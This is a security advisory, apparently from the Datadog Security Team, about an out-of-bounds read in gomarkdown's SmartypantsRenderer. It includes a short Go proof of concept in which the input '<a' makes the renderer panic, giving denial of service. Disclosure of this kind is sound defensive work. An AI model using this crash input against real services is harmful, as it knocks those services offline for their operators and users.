summary: "Go Markdown has an Out-of-bounds Read in SmartypantsRenderer\n### Summary\n\nProcessing\
  \ a malformed input containing a `<` character that is not followed by a `>` character anywhere\
  \ in the remaining text with a SmartypantsRenderer will lead to Out of Bounds read or a panic.\n\
  \n### Details\n\nThe `smartLeftAngle()` function in `html/smartypants.go:367-376` performs\
  \ an out-of-bounds slice operation when processing a `<` character that is not followed by\
  \ a `>` character anywhere in the remaining text.\nhttps://github.com/gomarkdown/markdown/blob/37c66b85d6ab025ba67a73ba03b7f3ef55859cca/html/smartypants.go#L367-L376\n\
  If the length of the slice is lower than its capacity, this leads to an extra byte of data\
  \ read. If the length equals the capacity, this leads to a panic.\n\n### PoC\n```golang\n\
  package main\n\nimport (\n\t\"bytes\"\n\t\"fmt\"\n\n\t\"github.com/gomarkdown/markdown/html\"\
  \n)\n\nfunc main() {\n\tsrc := []byte(\"<a\")\n\n\tfmt.Printf(\"Input: %q  (len=%d, cap=%d)\\\
  n\", src, len(src), cap(src))\n\n\tvar buf bytes.Buffer\n\tsp := html.NewSmartypantsRenderer(html.Smartypants)\n\
  \tsp.Process(&buf, src) // panics: slice bounds out of range\n\n\tfmt.Printf(\"Output: %q\\\
  n\", buf.String())\n}\n```\n\n### Impact\nThis vulnerability will lead to a Denial of Service\
  \ / panic on the processing service.\n\n\n-- The Datadog Security Team"
